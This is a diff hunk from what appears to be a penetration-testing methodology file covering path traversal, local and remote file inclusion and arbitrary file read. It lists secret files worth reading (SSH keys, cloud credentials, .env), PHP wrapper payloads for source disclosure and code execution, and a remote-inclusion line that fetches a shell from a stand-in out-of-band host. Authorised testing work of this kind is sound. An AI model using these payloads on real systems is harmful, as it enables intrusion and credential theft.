@@ -24,7 +24,7 @@ curl -s "https://TARGET/download?file=/etc/passwd"                       # absol
 - Confirm: the response **contains file content** (`root:x:0:0` for passwd, `[extensions]` for win.ini), not just a 200.
 - High-value reads: `/etc/passwd`, `/etc/hosts`, `/proc/self/environ`, `/proc/self/cmdline`, app source, `.env`, `config.php`, `web.config`, `appsettings.json`, `~/.aws/credentials`, `~/.ssh/id_rsa`, cloud creds, framework secrets.
 - PHP wrappers for LFI→source disclosure / RCE: `php://filter/convert.base64-encode/resource=index.php`, `php://filter/read=string.rot13/...`, `data://`, `expect://`, log poisoning (access/error/SSH logs → `/proc/self/environ`), session-file inclusion.
-- **RFI** (CWE-98): `?page=http://OOB/shell.txt` — confirm with an OOB fetch (rare; needs `allow_url_include`). Also try `\\attacker\share` (Windows UNC).
+- **RFI** (CWE-98): `?page=http://OOB_HOST/shell.txt` — confirm with an OOB fetch (rare; needs `allow_url_include`). Also try `\\attacker\share` (Windows UNC).
 
 ## Arbitrary file read/write
 - Read: any traversal that reaches app config/secrets (`.env`, `config.php`, cloud creds, `id_rsa`) → high/critical; record the secret as `loot`.
